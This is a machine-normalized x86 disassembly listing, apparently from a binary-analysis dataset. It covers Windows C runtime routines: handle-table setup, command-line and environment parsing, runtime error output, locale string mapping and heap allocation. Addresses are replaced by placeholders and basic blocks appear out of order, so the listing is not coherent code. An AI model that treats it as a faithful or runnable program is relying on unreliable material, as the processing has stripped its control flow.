jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_1000b1a6
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_100096ed
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_1000f6f4
push ebx
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
mov edi eax
add eax 0x480
cmp edi eax
jae r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push [ esi ]
call sub_10009e3d
and [ esi ] 0x0
pop ecx
lea ebx [ edi + 0xc ]
mov eax [ esi ]
add edi 0x24
add eax 0x480
add ebx 0x24
cmp edi eax
jb r-xdata
push ebx
call [ DeleteCriticalSection@IAT ]
cmp [ ebx - 0x4 ] 0x0
je r-xdata
sub_1000f748
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_10010d66
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_100096ed
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_1000b1a6
pop ecx
push esi
call sub_1000d910
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_10009e3d
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_100096ed
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_1000d910
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_1000d820
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_1000b1a6
pop ecx
sub_1000f801
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_10010d66
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_1000f89a
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_100096ed
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_1000f89a
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_1000b1a6
pop ecx
sub_1000f89a
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_1000fa4e
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_100096ed
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_100096ed
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_1000d1e0
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10009e3d
pop ecx
mov [ esp + 0x10 ] ebx
sub_1000fb80
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1000fbb9
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_1000fbb9
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1000fbb9
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jb r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_1000d910
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_1000d910
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_1000d820
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_1000d820
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_1000d830
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_1000d830
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_1000d830
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_10010d82
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_1000d910
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_100092c0
add esp 0x10
sub_1000fd10
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_1000fd50
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_1000fda8
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1000ffcc
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_1000a610
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_1000a610
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_1000ffcc
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_1000fff7
inc [ rw-data ]
push 0x1000
call sub_100096ed
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_1001003b
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_10010064
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100100bd
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_1000b26e
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_1000b2cf
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100100bd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_1000d588
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_10010126
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
mov [ ebp - 0x1c ] esi
cmp esi 0xffffffe0
ja r-xdata
xor ebx ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
jmp r-xdata
push 0x1
pop esi
mov eax [ ebp - 0x20 ]
cmp [ rw-data ] ebx
je r-xdata
cmp eax 0x2
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp edi [ rw-data ]
ja r-xdata
mov [ ebp - 0x20 ] ebx
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_1000cf42
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
push 0x9
call sub_1000b26e
pop ecx
mov [ ebp - 0x4 ] ebx
push edi
call sub_1000c0ca
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_100101bf
cmp [ ebp - 0x20 ] ebx
je r-xdata
jmp r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x20 ] eax
push 0x9
call sub_1000b26e
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_1000cb6d
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_10010248
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x1c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
push ebx
push [ ebp - 0x20 ]
call sub_1000fd50
add esp 0xc
sub_10010263
push ebx
push edi
push 0x2
xor ebx ebx
call sub_1000b26e
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_1000b2cf
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_1000a7f4
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_10009e3d
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_100102e4
push ecx
push ecx
push ebx
push ebp
push esi
push edi
push 0x12
or edi 0xffffffff
call sub_1000b26e
xor ebx ebx
pop ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov ebp rw-data
mov esi 0x480
push esi
call sub_100096ed
test eax eax
pop ecx
je r-xdata
lea eax [ esi + 0x480 ]
push 0x12
call sub_1000b2cf
pop ecx
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
add [ rw-data ] 0x20
lea ecx [ ebx * 4 + rw-data ]
lea edx [ eax + 0x480 ]
mov [ ecx ] eax
add [ esp + 0x14 ] 0x20
add ebp 0x4
inc ebx
cmp ebp rw-data
mov [ esp + 0x10 ] ebx
jl r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl ebx 0x5
mov edi ebx
push edi
call sub_10010544
pop ecx
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x24
add edx esi
jmp r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp ]
add esi 0x24
add eax 0x480
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp eax edx
jae r-xdata
cmp esi eax
jae r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
push 0x11
call sub_1000b26e
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
or [ esi ] 0xffffffff
mov eax esi
sub eax [ ebp ]
push 0x24
pop ecx
cdq
idiv ecx
mov edi eax
add edi [ esp + 0x14 ]
cmp edi 0xffffffff
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x10 ]
push 0x11
call sub_1000b2cf
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov ebx [ esp + 0x10 ]
sub_10010407
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_1000d588
mov [ eax ] 0x9
call sub_1000d591
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
cmp [ eax + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10010483
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_1000d588
mov [ eax ] 0x9
call sub_1000d591
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_10010502
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_1000d588
mov [ eax ] 0x9
call sub_1000d591
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_10010544
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_1000b26e
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_1000b2cf
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_1001062c
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_1000d588
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_10010544
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000d588
